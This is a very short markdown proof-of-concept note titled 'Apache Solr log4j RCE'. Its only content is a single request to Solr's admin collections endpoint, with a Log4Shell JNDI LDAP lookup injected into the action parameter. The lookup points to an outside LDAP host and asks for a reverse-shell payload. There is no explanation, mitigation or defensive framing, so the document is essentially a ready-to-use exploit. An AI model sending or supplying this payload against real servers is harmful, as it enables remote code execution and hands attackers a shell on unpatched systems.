# Apache Solr log4j RCE

## Poc

```
/solr/admin/collections?action=${jndi:ldap://xxx/Basic/ReverseShell/ip/9999}&wt=json
```

